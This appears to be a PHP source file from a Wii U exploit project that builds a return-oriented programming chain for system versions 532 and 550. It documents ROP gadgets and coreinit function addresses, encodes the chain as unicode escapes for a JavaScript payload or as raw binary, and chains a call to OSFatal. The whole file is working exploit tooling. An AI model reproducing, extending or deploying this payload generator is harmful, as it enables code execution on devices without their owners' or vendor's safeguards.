<?php

if(!isset($sysver))$sysver = -1;

if(isset($_REQUEST['sysver']))
{
	if($_REQUEST['sysver']==="532")
	{
		$sysver = 532;
	}
	else if($_REQUEST['sysver']==="550")
	{
		$sysver = 550;
	}
}

if($sysver===-1)die("The system-version must be specified via an URL parameter.");

require_once("wiiuhaxx_rop_sysver_$sysver.php");

$ropchainselect = -1;
if($ropchainselect == -1)
{
	$ropchainselect = 1;
}

if(!isset($generatebinrop))$generatebinrop = 0;

/*
Documentation for the addrs loaded from the above:

$ROP_POPJUMPLR_STACK12 Load LR from stackreg+12, add stackreg with 8, then jump to LR.
$ROP_POPJUMPLR_STACK20 Add stackreg with 16, load LR from stackreg+4 then jump to LR.
$ROP_CALLFUNC Call the code with the address stored in r27, with: r3=r29, r4=r31, r5=r25, r6=r24, r7=r28. Then once it returns from that code: r3=r29. Load r20..r31 from the data starting at stackreg+8. Load LR from stackreg+60, add stackreg with 56, then jump to LR.
$ROP_CALLR28_POP_R28_TO_R31 Set r4 to r31, then call the code with the address stored in r28. Load r28..r31 from the data starting at stackreg+8. Load LR from stackreg+28. Add stackreg with 24, then jump to LR.
$ROP_POP_R28R29R30R31 Load r28..r31 from the data starting at stackreg+8. Load LR from stackreg+28, add stackreg with 24, then jump to LR.
$ROP_POP_R27 Load r27 from stackreg+12. Load LR from stackreg+36, add stackreg with 32, then jump to LR.
$ROP_POP_R24_TO_R31 Load r24..r31 with the data starting at stackreg+16. Load LR from stackreg+52. Add stackreg with 48, then jump to LR.

$ROP_memcpy Address of "memcpy" in coreinit.
$ROP_DCFlushRange Address of "DCFlushRange" in coreinit. void DCFlushRange(const void *addr, size_t length);
$ROP_ICInvalidateRange Address of "ICInvalidateRange" in coreinit. void ICInvalidateRange(const void *addr, size_t length);
$ROP_OSSwitchSecCodeGenMode Address of "OSSwitchSecCodeGenMode" in coreinit. OSSwitchSecCodeGenMode(bool execute)
$ROP_OSSetThreadAffinity Address of "OSSetThreadAffinity" in coreinit. OSSetThreadAffinity(OSThread* thread, u32 affinity)
$ROP_OSYieldThread Address of "OSYieldThread" in coreinit. OSYieldThread(void)
$ROP_OSFatal Address of "$ROP_OSFatal" in coreinit.
*/

function genu32_unicode($value)//This would need updated to support big-endian.
{
	$hexstr = sprintf("%08x", $value);
	$outstr = "\u" . substr($hexstr, 4, 4) . "\u" . substr($hexstr, 0, 4);
	return $outstr;
}
function genu32_unicode_jswrap($value)
{
	$str = "\"" . genu32_unicode($value) . "\"";
	return $str;
}
function ropchain_appendu32($val)
{
	global $ROPCHAIN, $generatebinrop;
	if($generatebinrop==0)
	{
		$ROPCHAIN.= genu32_unicode($val);
	}
	else
	{
		$ROPCHAIN.= pack("N*", $val);
	}
}

function generate_ropchain()
{
	global $ROPCHAIN, $generatebinrop, $ropchainselect;

	$ROPCHAIN = "";

	if($generatebinrop==0)$ROPCHAIN .= "\"";

	if($ropchainselect==1)
	{
		generateropchain_type1();
	}

	if($generatebinrop==0)$ROPCHAIN.= "\"";
}

function ropgen_pop_r24_to_r31($inputregs)
{
	global $ROP_POP_R24_TO_R31;

	ropchain_appendu32($ROP_POP_R24_TO_R31);
	ropchain_appendu32(0x0);
	ropchain_appendu32(0x0);
	for($i=0; $i<(32-24); $i++)ropchain_appendu32($inputregs[$i]);
	ropchain_appendu32(0x0);
}

function ropgen_callfunc($funcaddr, $r3, $r4, $r5, $r6)
{
	global $ROP_CALLR28_POP_R28_TO_R31, $ROP_CALLFUNC;

	$inputregs = array();
	$inputregs[24 - 24] = $r6;//r24 / r6
	$inputregs[25 - 24] = $r5;//r25 / r5
	$inputregs[26 - 24] = 0x0;//r26
	$inputregs[27 - 24] = $ROP_CALLR28_POP_R28_TO_R31;//r27
	$inputregs[28 - 24] = $funcaddr;//r28 / r7
	$inputregs[29 - 24] = $r3;//r29 / r3
	$inputregs[30 - 24] = 0x0;//r30
	$inputregs[31 - 24] = $r4;//r31 / r4

	ropgen_pop_r24_to_r31($inputregs);

	ropchain_appendu32($ROP_CALLFUNC);

	ropchain_appendu32(0x0);//r28
	ropchain_appendu32(0x0);//r29
	ropchain_appendu32(0x0);//r30
	ropchain_appendu32(0x0);//r31
	ropchain_appendu32(0x0);
}

function generateropchain_type1()
{
	global $ROP_OSFatal;
	ropgen_callfunc($ROP_OSFatal, 0x14572D28, 0x0, 0x0, 0x0);//OSFatal(<data from the haxx>);
}

?>
